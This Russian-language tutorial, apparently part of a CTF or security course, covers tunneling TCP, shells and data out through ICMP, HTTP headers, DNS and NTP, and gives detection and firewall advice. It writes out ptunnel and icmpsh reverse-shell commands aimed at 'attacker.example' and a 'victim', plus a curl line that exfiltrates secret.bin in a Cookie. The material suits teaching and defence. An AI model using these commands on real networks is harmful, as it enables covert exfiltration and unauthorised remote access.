## Вопрос, с которого всё начинается

Периметр пропускает наружу **только ICMP** — обычный `ping`. Никакого TCP, никакого HTTPS. А тебе нужно достучаться до внутреннего SSH `10.0.0.5:22`. Можно ли протащить полноценное TCP-соединение внутри ping-пакетов?

Можно. ICMP Echo Request/Reply несут **payload**, который почти никто не инспектирует. На этом строится целый класс туннелей.

## Наш пример: наружу ходит только ping

Проверяем egress — всё, кроме ICMP, упирается в таймаут:

```
$ nc -vz attacker.example 443
nc: connect to attacker.example port 443 (tcp) failed: Connection timed out
$ ping -c1 attacker.example
64 bytes from attacker.example: icmp_seq=1 ttl=52 time=31 ms
```

HTTPS не проходит, ICMP — проходит. Значит, носителем будет ICMP.

## Шаг 1: ICMP несёт произвольный payload

У `ping` есть флаг `-p`, задающий payload в hex. Положим туда строку `flag` (`66 6c 61 67`):

```
$ ping -c1 -p 666c6167 10.0.0.5
PATTERN: 0x666c6167
$ sudo tcpdump -i eth0 -n -X icmp -c 1
... 0x0010:  ... 66 6c 61 67 ...
```

Стандартный `ping` шлёт повторяющийся алфавит (`0x10..0x37`) или пусто. Любой «осмысленный» payload — уже аномалия. Поля ICMP, которые можно использовать:

| Поле | Размер | Как используют |
|---|---|---|
| type/code | 2 | скрытые биты |
| identifier | 2 | метка потока |
| sequence | 2 | номер чанка |
| payload | ~1472 | основной канал |

## Шаг 2: ptunnel — TCP поверх ICMP

`ptunnel` инкапсулирует целую TCP-сессию в ICMP Echo. Схема: клиент внутри сети шлёт Echo Request с данными, **прокси-сервер** снаружи извлекает их, устанавливает реальное TCP-соединение к цели и возвращает ответ в Echo Reply.

```
# на внешнем хосте — сервер с паролем:
$ ptunnel -x MySecret -v

# на внутреннем хосте — клиент:
$ ptunnel -p attacker.example -lp 2222 -da 10.0.0.5 -dp 22 -x MySecret -v
```

Флаги: `-lp` (локальный порт), `-da`/`-dp` (адрес и порт цели), `-x` (пароль, чтобы туннелем не воспользовались чужие). Теперь на локальной машине `127.0.0.1:2222` — это SSH цели через ICMP:

```
$ ssh -p 2222 user@127.0.0.1
```

Смотрим, как это выглядит на проводе:

```
$ sudo tcpdump -i eth0 -nn 'icmp and greater 64' -c 3
10:30:01.100 10.0.0.2 > 203.0.113.9: ICMP echo request, id 4211, seq 1, length 1200
```

Пинг с payload в 1200 байт и высокой частотой — вот характерный след туннеля.

## Шаг 3: другие носители

ICMP — не единственный и не лучший канал. Чем «обычнее» протокол для периметра, тем незаметнее туннель:

| Носитель | Полоса | Заметность | Когда выбирать |
|---|---|---|---|
| ICMP payload | средняя | средняя (payload виден) | разрешён только ping |
| DNS (поддомены/TXT) | низкая | низкая | разрешён только DNS |
| HTTP(S) заголовки | высокая | очень низкая | есть исходящий веб |
| NTP | очень низкая | очень низкая | только NTP наружу |

**HTTP-канал** маскируется под обычный веб: данные прячут в `Cookie`, `User-Agent`, `X-Request-ID`, теле POST или в пути URL. **NTP-канал** использует младшие биты полей пакета. См. [`network-dns-tunnel`](network-dns-tunnel) для DNS.

## Шаг 4: детект (для SOC)

Нормальный `ping` — фиксированные 32/64 байта payload и низкая частота. Всё, что отклоняется, подозрительно:

```
$ tshark -r cap.pcap -Y 'icmp.type==8' -T fields -e data.len | sort -n | uniq -c | sort -rn | head
   412	32
   388	1200
```

Триста восемьдесят восемь пакетов по 1200 байт — это не диагностика, а канал. Дополнительно проверяют энтропию payload (закодированные данные выделяются) и асимметрию (много запросов без «нормальных» ответов).

## Шаг 5: защита

Полный запрет ICMP — плохая идея: он ломает диагностику и **PMTU discovery** (без `frag-needed`/`packet-too-big` крупные сессии зависают). Правильно — разрешать только необходимые типы:

- `echo-request` — если нужен мониторинг, но с лимитом размера и частоты;
- `destination-unreachable` (type 3), особенно `frag-needed` — обязательно;
- `time-exceeded` (type 11) — для traceroute;
- блокировать нестандартные типы и большой payload; DPI на ICMP-туннели.

```
$ nft add rule inet filter input icmp type echo-request icmp length 8-128 accept
$ nft add rule inet filter input icmp type echo-request drop
```

## Шаг 6: icmpsh — обратный shell через ICMP

`ptunnel` пробрасывает порт, а `icmpsh` даёт **интерактивный shell** поверх ping. Сервер запускается у нас, клиент — на жертве.

```
# на нашей машине (сначала отключим ответы ядра на пинги, иначе они мешают):
$ sysctl -w net.ipv4.icmp_echo_ignore_all=1
$ ./icmpsh_m.py <наш_IP> <IP_жертвы>

# на жертве:
$ ./icmpsh.exe -t <наш_IP> -d 500 -b 30 -s 128
```

Каждый Echo Request несёт команду, каждый Reply — вывод. Это медленно (интерактив через ping), но работает там, где разрешён только ICMP. Детект тот же: аномальные размеры и частота пингов плюс симметричный обмен «запрос-ответ» без пауз.

## Шаг 7: HTTP-инкапсуляция в деталях

Самый незаметный канал — тот, что сливается с обычным вебом. Данные прячут там, где прокси и фильтры не разбирают содержимое:

- **Cookie** — длинное значение `sess=...` выглядит как обычная сессия.
- **User-Agent / X-Request-ID** — заголовок с base64-строкой.
- **Тело POST** — JSON с «полями телеметрии».
- **Путь URL** — `/api/v1/<base64data>`.

Пример эксфильтрации через cookie:

```
$ curl -s -H "Cookie: sess=$(base64 -w0 secret.bin)" https://attacker.example/collect
```

На проводе это обычный HTTPS-запрос к «аналитике». Признак — **устойчивый поток** к одному домену, заголовок которого меняется каждый раз, с аномально длинными значениями. Поэтому в SOC профилируют не содержимое, а поведение: регулярность, размеры, один получатель.

## Шаг 8: NTP и другие неочевидные носители

Иногда наружу разрешён ровно один протокол — и туннель строят на нём.

**NTP (UDP/123)** — клиент шлёт запрос времени, сервер отвечает. Данные прячут в младших битах полей (transmit timestamp, precision). Пропускная способность — единицы байт в секунду, зато канал неотличим от легитимной синхронизации, которую никто не проверяет.

**ICMP-типы как носитель** — вместо payload данные кладут в `identifier`/`sequence`: каждая пара «запрос-ответ» кодирует байт. Payload пустой, но значения полей меняются не по «нормальному» шаблону.

**TLS SNI / сертификаты** — экзотика, но встречается в CTF: данные в поддомене SNI или в поле сертификата.

Общее правило: чем «скучнее» и нужнее протокол, тем меньше инспектируют его содержимое — и тем удобнее он для скрытого канала.

## Комбинация с другими каналами

На практике атакующие комбинируют носители: DNS для коротких команд, ICMP для данных, HTTP для fallback. Поэтому детект должен покрывать **все** разрешённые протоколы, а не только ICMP. Если ICMP-канал уже найден, проверь, нет ли рядом DNS- или HTTP-канала — часто они идут параллельно. Это делает детект задачей корреляции нескольких источников, а не поиска одной сигнатуры.

## Сборка данных из ICMP-туннеля

Найдя аномальные пинги, данные собирают и декодируют. Собираем payload всех Echo Request по порядку времени:

```
$ tshark -r cap.pcap -Y 'icmp.type==8 && data.len>0' -T fields -e data \
    | tr -d '\n' | xxd -r -p > payload.bin
$ file payload.bin && strings -n 6 payload.bin | head
```

Частая CTF-ловушка: данные кодируются не в payload, а в **порядке** пакетов или в значении `identifier`. Тогда собирают последовательность значений и интерпретируют её как байты. Если и это пусто — данные могли чередоваться между request и reply, поэтому собирай оба направления.

## Что мы теперь знаем

- ICMP часто разрешён, а его payload редко инспектируется — идеальный носитель.
- `ptunnel` переносит TCP поверх ICMP Echo, `icmpsh` — reverse shell.
- Данные прячут и в HTTP-заголовках, DNS и NTP — не только в ICMP.
- Туннель выдаёт большой/аномальный payload и высокая частота пингов.
- Нельзя блокировать весь ICMP: нужны отдельные типы (PMTU), лимиты и DPI.
- icmpsh даёт reverse shell поверх ICMP; ptunnel — проброс TCP-порта.
- NTP и младшие биты полей — тоже носитель для очень медленных каналов.
- HTTP-канал прячется в Cookie/User-Agent/URL и сливается с обычным вебом.
- Детект — корреляция: если найден ICMP-канал, ищи рядом DNS/HTTP.
- Аномалия ICMP — большой/меняющийся payload, высокая частота, симметрия без пауз.
- Разрешать echo-request с лимитом длины (8-128) и частоты — разумный компромисс.
- Скрытые данные могут быть в identifier/sequence, а не в payload — проверяй поля.

## Куда дальше

Мы спрятали TCP в ICMP. Дальше разберём ещё более тонкие каналы — тайминговые, где данные кодируются самими задержками между пакетами, и их детект. А пока запомни: **любой разрешённый наружу протокол с полем данных — потенциальный туннель.**
